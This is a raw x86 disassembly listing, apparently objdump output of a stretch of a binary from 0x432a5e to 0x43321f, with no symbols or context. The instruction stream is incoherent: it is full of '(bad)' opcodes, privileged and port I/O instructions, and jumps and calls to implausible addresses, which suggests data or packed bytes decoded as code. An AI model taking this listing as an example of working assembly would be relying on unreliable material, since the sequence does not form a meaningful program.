  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
